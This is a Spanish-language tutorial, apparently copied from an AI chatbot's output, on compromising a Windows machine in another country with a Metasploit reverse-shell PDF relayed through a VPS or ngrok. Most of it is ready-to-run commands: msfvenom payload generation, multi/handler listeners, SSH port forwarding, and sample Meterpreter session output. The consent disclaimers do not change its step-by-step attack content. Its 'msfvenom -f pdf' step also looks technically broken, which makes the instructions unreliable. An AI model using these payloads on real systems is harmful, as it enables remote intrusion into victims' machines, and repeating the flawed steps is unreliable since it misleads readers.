Ejemplo usando un Servidor VPS como Intermediario
Este enfoque utiliza un servidor VPS ubicado en Internet para recibir la conexión de la máquina objetivo en Colombia y reenviarla al atacante en México.

Requisitos
Un VPS (por ejemplo, de un proveedor como DigitalOcean, AWS, o cualquier servidor que permita conexiones públicas).
Metasploit instalado en tu máquina atacante en México y en el VPS (opcional).
Paso 1: Configurar el VPS
Obtener el VPS:

Contrata un servidor VPS con una IP pública, como en DigitalOcean, Linode o AWS.
Instala Metasploit en el VPS si deseas administrar las conexiones desde allí (opcional).
Asegúrate de que el VPS permita el tráfico en el puerto que usarás para la conexión (por ejemplo, el puerto 4444).
Configurar el Listener en el VPS:

En el VPS, inicia Metasploit y configura un listener para recibir la conexión desde la máquina objetivo en Colombia:
bash
Copiar código
msfconsole
Configura el listener en Metasploit para escuchar en el puerto 4444 y en la IP pública del VPS:
bash
Copiar código
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST vps_ip_publica  # IP pública del VPS
set LPORT 4444
exploit
Mantener el Listener en Ejecución:

Deja este listener en ejecución para que esté listo para recibir la conexión cuando el archivo PDF se abra en la máquina objetivo.
Paso 2: Crear el Payload en la Máquina Atacante (México)
En tu máquina atacante en México, usa msfvenom para crear un payload que se conectará a la IP pública del VPS y al puerto 4444 que configuraste anteriormente.

bash
Copiar código
msfvenom -p windows/meterpreter/reverse_tcp LHOST=vps_ip_publica LPORT=4444 -f pdf > exploit.pdf
Aquí:

-p windows/meterpreter/reverse_tcp: Define el payload que abrirá una conexión de reversa hacia el VPS.
LHOST=vps_ip_publica: La dirección IP pública del VPS.
LPORT=4444: El puerto configurado en el VPS para escuchar conexiones.
-f pdf > exploit.pdf: Crea el archivo PDF malicioso con el payload y lo guarda como exploit.pdf.
Paso 3: Enviar el PDF a la Máquina Objetivo en Colombia
Una vez generado el archivo PDF (exploit.pdf), deberás enviarlo a la máquina objetivo en Colombia. Recuerda que el envío de este archivo en entornos no controlados y sin consentimiento es ilegal. En un laboratorio, podrías cargar el archivo en una máquina de pruebas remota.

Paso 4: Conexión desde la Máquina Objetivo en Colombia al VPS
Cuando la máquina objetivo en Colombia abra el archivo exploit.pdf, el payload incrustado intentará conectarse a la IP pública del VPS en el puerto 4444.

Listener en el VPS: Si el listener en el VPS está configurado correctamente, verás que la conexión se establece y se abre una sesión de Meterpreter en la máquina víctima.
Salida en el VPS: En el terminal del VPS, deberías ver una conexión entrante similar a esta:
less
Copiar código
[*] Started reverse TCP handler on vps_ip_publica:4444 
[*] Sending stage (206403 bytes) to [IP_victima]
[*] Meterpreter session 1 opened (vps_ip_publica:4444) at 2024-11-07 12:00:00 UTC
Ahora tienes acceso a la máquina objetivo en Colombia desde el VPS. Desde la sesión de Meterpreter en el VPS, puedes interactuar con la máquina víctima y realizar las pruebas de seguridad necesarias en un entorno controlado.

Paso 5: (Opcional) Conectar la Máquina Atacante en México al VPS
Si prefieres manejar la conexión desde tu máquina en México, puedes hacer un túnel SSH desde el VPS a tu máquina local para reenviar la sesión de Meterpreter. Esto implica conectarte al VPS desde tu máquina atacante en México usando SSH con reenvío de puertos.

Crear el túnel SSH:

Abre una conexión SSH desde la máquina atacante en México al VPS, reenviando el puerto de Meterpreter:
bash
Copiar código
ssh -L 4444:localhost:4444 usuario@vps_ip_publica
Esto redirige el puerto 4444 del VPS a tu máquina local en México.
Iniciar un listener en la máquina atacante:

En tu máquina atacante, abre otra sesión de Metasploit y configura un listener para el puerto local 4444:
bash
Copiar código
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
De esta manera, la sesión de Meterpreter que se inicia en el VPS será redirigida automáticamente a tu máquina atacante en México a través del túnel SSH.

Alternativa: Uso de Ngrok
Si no puedes usar un VPS o prefieres un método más rápido, Ngrok puede proporcionar un túnel temporal. Aquí tienes los pasos básicos:

Iniciar Ngrok en el puerto 4444:

bash
Copiar código
ngrok tcp 4444
Esto generará una URL pública, como tcp://0.tcp.ngrok.io:12345.

Crear el payload con la URL de Ngrok:

bash
Copiar código
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f pdf > exploit.pdf
Configurar el listener en Metasploit en la máquina atacante:

bash
Copiar código
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
Cuando la víctima abra el archivo PDF, se establecerá la conexión a través de Ngrok, permitiendo la conexión remota sin un VPS. Esta conexión es temporal y durará solo mientras Ngrok esté en ejecución.

Consideraciones Finales
Estos métodos son efectivos para probar la conectividad en un entorno controlado, asegurándote de que la máquina víctima esté en una ubicación geográfica distinta o en una red diferente. Siempre realiza estas pruebas con consentimiento y en entornos de laboratorio supervisados para cumplir con prácticas éticas y legales en la seguridad informática.
